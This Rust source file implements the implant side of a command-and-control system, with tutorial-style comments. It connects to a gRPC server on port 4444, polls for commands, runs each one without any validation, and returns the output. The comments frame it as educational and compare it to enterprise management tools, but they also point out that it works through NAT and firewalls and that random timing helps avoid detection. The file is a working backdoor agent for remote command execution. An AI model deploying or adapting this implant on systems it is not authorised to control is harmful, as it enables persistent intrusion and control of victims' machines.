//! Implant Client - Remote agent that executes commands
//!
//! PURPOSE:
//! This is the "agent" or "implant" in a C2 (Command & Control) system.
//! In real-world scenarios, this would be deployed on remote systems to
//! enable remote administration and management.
//!
//! EDUCATIONAL CONTEXT:
//! This demonstrates the same patterns used by:
//! - Enterprise management tools (SCCM, Jamf, Puppet)
//! - Remote administration software
//! - IoT device management systems
//!
//! HOW IT WORKS:
//! 1. Connect to the C2 server (implant server on port 4444)
//! 2. Poll every 3 seconds for commands
//! 3. If a command is available, execute it
//! 4. Send the output back to the server
//! 5. Repeat forever
//!
//! POLLING PATTERN:
//! The implant uses "polling" (regularly asking for work) rather than
//! "push" (server pushes work to implant). Benefits:
//! - Works behind NAT/firewalls (implant initiates connection)
//! - Implant controls timing (can randomize to avoid detection)
//! - Server doesn't need to track implant addresses

use grpc_rs::proto::implant_client::ImplantClient;
use grpc_rs::proto::{Command, Empty};
use std::env;
use std::time::Duration;
use tokio::process::Command as TokioCommand;
use tokio::time::sleep;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // ========== CONFIGURATION ==========
    // Get server URL from environment variable or use default
    // This allows easy reconfiguration without recompiling:
    //   GRPC_SERVER_URL=http://10.0.0.5:4444 ./implant
    let grpc_url = env::var("GRPC_SERVER_URL")
        .unwrap_or_else(|_| "http://localhost:4444".to_string());

    println!("Implant starting...");
    println!("Connecting to server at {}", grpc_url);

    // ========== ESTABLISH CONNECTION ==========
    // Connect to the gRPC server
    // This establishes an HTTP/2 connection that will be reused for all RPCs
    let mut client = ImplantClient::connect(grpc_url).await?;

    println!("Connected! Polling for commands every 3 seconds...");

    // ========== MAIN POLLING LOOP ==========
    // This loop runs forever, constantly checking for new commands
    // In production, you might want:
    // - Randomized sleep intervals (1-5 seconds) to avoid patterns
    // - Exponential backoff on errors
    // - Graceful shutdown signal handling
    loop {
        // Create an empty request (FetchCommand takes no parameters)
        let request = tonic::Request::new(Empty {});

        // Call the FetchCommand RPC
        // This asks the server: "Do you have any work for me?"
        match client.fetch_command(request).await {
            Ok(response) => {
                let cmd = response.into_inner();

                // Check if there's actual work to do
                // Server returns empty Command.inp when no work available
                if cmd.inp.is_empty() {
                    // No work available, sleep before next poll
                    // WHY SLEEP?
                    // - Reduces network traffic and server load
                    // - Prevents tight loop consuming CPU
                    // - Creates predictable polling interval
                    sleep(Duration::from_secs(3)).await;
                    continue;
                }

                println!("Received command: {}", cmd.inp);

                // ========== EXECUTE COMMAND ==========
                // Execute the command and capture output
                let output = execute_command(&cmd.inp).await;

                println!("Command output: {}", output);

                // ========== SEND RESULT BACK ==========
                // Create a Command with both input and output
                // This allows the admin to see what command was executed
                let response_cmd = Command {
                    inp: cmd.inp,  // Echo back the command
                    out: output,   // Add the execution result
                };

                let request = tonic::Request::new(response_cmd);

                // Call SendOutput RPC to return the result
                match client.send_output(request).await {
                    Ok(_) => println!("Output sent successfully"),
                    Err(e) => eprintln!("Failed to send output: {}", e),
                }
                // After sending, immediately poll again for next command
                // (no sleep here - there might be more work queued)
            }
            Err(e) => {
                // Failed to fetch command (network error, server down, etc.)
                eprintln!("Failed to fetch command: {}", e);
                // Sleep before retrying to avoid flooding the server
                sleep(Duration::from_secs(3)).await;
            }
        }
    }
}

/// Execute a shell command and return combined output
///
/// SECURITY NOTE (for educational purposes):
/// This function executes arbitrary shell commands without validation.
/// In production systems, you should:
/// - Whitelist allowed commands
/// - Validate and sanitize inputs
/// - Run with minimal privileges
/// - Log all executed commands
/// - Implement command timeouts
///
/// PARAMETERS:
/// - input: Command string (e.g., "ls -la" or "whoami")
///
/// RETURNS:
/// - String containing stdout, stderr, and exit status
async fn execute_command(input: &str) -> String {
    // ========== PARSE COMMAND ==========
    // Split the command string into program and arguments
    // Example: "ls -la /tmp" -> ["ls", "-la", "/tmp"]
    let tokens: Vec<&str> = input.split_whitespace().collect();

    if tokens.is_empty() {
        return "Error: Empty command".to_string();
    }

    // ========== BUILD TOKIO COMMAND ==========
    // Use tokio::process::Command (async version of std::process::Command)
    // This allows command execution without blocking the async runtime
    let mut cmd = TokioCommand::new(tokens[0]);  // First token is the program

    // Add remaining tokens as arguments
    if tokens.len() > 1 {
        cmd.args(&tokens[1..]);
    }

    // ========== EXECUTE AND CAPTURE ==========
    // output().await runs the command and waits for it to complete
    // It captures both stdout and stderr
    match cmd.output().await {
        Ok(output) => {
            let mut result = String::new();

            // Capture stdout (standard output)
            if !output.stdout.is_empty() {
                // from_utf8_lossy handles non-UTF8 bytes gracefully
                result.push_str(&String::from_utf8_lossy(&output.stdout));
            }

            // Capture stderr (standard error)
            if !output.stderr.is_empty() {
                if !result.is_empty() {
                    result.push('\n');
                }
                result.push_str(&String::from_utf8_lossy(&output.stderr));
            }

            // Add exit status if command failed
            // Unix: 0 = success, non-zero = error
            if !output.status.success() {
                if !result.is_empty() {
                    result.push('\n');
                }
                result.push_str(&format!("Command exited with status: {}", output.status));
            }

            result
        }
        Err(e) => {
            // Command execution failed (program not found, permission denied, etc.)
            format!("Failed to execute command: {}", e)
        }
    }
}